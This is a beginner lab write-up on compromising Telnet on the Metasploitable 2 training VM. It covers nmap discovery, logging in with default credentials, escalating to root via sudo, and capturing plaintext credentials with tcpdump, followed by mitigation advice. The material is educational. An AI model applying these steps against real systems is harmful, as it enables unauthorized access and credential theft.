✅ Telnet Remote Access & Credential Sniffing

Target: Metasploitable 2
Service: Telnet (TCP/23)
Attack Type: Initial Access + Credential Exposure + Privilege Escalation
Difficulty: Beginner
Status: Fully Compromised

📌 Overview

This lab demonstrates how an attacker can gain unauthorized access to a system running Telnet, steal clear‑text credentials over the network, and escalate to full system control.

Telnet is an outdated protocol that transmits all data — including usernames and passwords — in plaintext, making it highly vulnerable.

🔎 1. Service Discovery

Initial port scan:

nmap 192.168.56.101


Result excerpt:

23/tcp  open  telnet


Version detection:

nmap -sV -p 23 192.168.56.101


Result:

23/tcp open telnet  Linux telnetd


✅ Telnet is active and accepting remote logins.

🏁 2. Manual Access via Telnet

Attempting connection:

telnet 192.168.56.101


The service prompts for credentials:

login:
password:


Metasploitable 2 ships with default credentials:

Username: msfadmin
Password: msfadmin


After logging in:

whoami


Output:

msfadmin


✅ We now have a remote shell as a valid system user.

🚨 Vulnerability Exploited

Protocol transmits all data in plaintext

Weak default credentials

No access restrictions

No encryption or authentication hardening

This represents a real‑world misconfiguration often found in legacy environments.

🎯 3. Privilege Escalation

Check sudo permissions:

sudo -l


Typical output on Metasploitable 2:

(ALL) ALL


Escalate:

sudo su


Enter password: msfadmin

Verify:

whoami

root


✅ Full system compromise.

🕵️ 4. Credential Sniffing (No Login Required)

An attacker on the same network can steal Telnet credentials without interacting with the victim, using passive network sniffing.

Start capture on the attacker machine (Kali):

sudo tcpdump -i eth0 -A port 23


Then perform a Telnet login from another terminal/machine.

Captured output will reveal:

login: msfadmin
password: msfadmin


✅ This proves that Telnet exposes credentials in clear text.

Why this matters:

No exploits required

No authentication required

Stealthy attack

Enables further system compromise

💥 Impact
Category	Risk
Confidentiality	Credentials exposed
Integrity	Attacker can modify system files
Availability	Full root access enables disruption
Lateral Movement	Credentials may work across other services
Persistence	Backdoors can be created

Final Result: The attacker gains complete control of the system.

🔧 5. Mitigation

✅ Disable Telnet entirely
✅ Replace with SSH
✅ Remove default credentials
✅ Enforce strong passwords & MFA
✅ Restrict remote access via firewall
✅ Implement network segmentation
✅ Monitor logs & detect suspicious logins

In modern environments, Telnet should never be exposed or used.

📚 Key Takeaways

Misconfigurations are often more dangerous than exploits

Plaintext protocols are a critical security risk

Attackers can compromise a system without touching passwords directly

Privilege escalation turns "access" into "ownership"
